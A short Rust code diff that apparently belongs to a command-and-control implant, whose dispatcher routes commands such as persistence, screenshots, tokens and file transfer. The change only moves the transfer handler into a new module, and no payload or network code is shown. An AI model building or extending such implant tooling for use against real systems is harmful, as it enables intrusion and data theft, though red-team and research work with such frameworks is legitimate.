@@ -36,6 +36,7 @@ mod persist;
 mod process;
 mod screenshot;
 mod token;
+mod transfer;
 
 use std::collections::HashMap;
 
@@ -176,7 +177,7 @@ pub fn dispatch(
         DemonCommand::CommandFs => {
             filesystem::handle_fs(&package.payload, package.request_id, downloads, mem_files)
         }
-        DemonCommand::CommandTransfer => filesystem::handle_transfer(&package.payload, downloads),
+        DemonCommand::CommandTransfer => transfer::handle_transfer(&package.payload, downloads),
         DemonCommand::CommandProc => process::handle_proc(&package.payload),
         DemonCommand::CommandProcList => process::handle_proc_list(&package.payload),
         DemonCommand::CommandNet => network::handle_net(&package.payload),
